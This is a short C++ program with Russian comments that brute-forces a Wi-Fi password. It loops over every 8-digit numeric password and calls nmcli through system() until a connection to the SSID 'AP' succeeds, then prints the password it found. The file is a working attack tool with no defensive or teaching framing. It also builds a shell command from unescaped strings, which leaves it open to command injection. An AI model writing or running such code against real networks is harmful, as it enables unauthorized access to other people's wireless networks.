#include <iostream>
#include <string>
#include <iomanip>
#include <sstream>
#include <cstdlib>

using namespace std;

// Функция для попытки подключения к Wi-Fi через nmcli в Linux
bool try_connect(const string& ssid, const string& password) {
    string command = "nmcli dev wifi connect '" + ssid + "' password '" + password + "'";
    int result = system(command.c_str());
    return result == 0;
}

int main() {
    string ssid = "AP";

    for (int i = 0; i < 100000000; ++i) {
        stringstream ss;
        ss << setw(8) << setfill('0') << i;
        string password = ss.str();

        if (try_connect(ssid, password)) {
            cout << "Успешное подключение с паролем: " << password << endl;
            break;
        }
    }

    return 0;
}
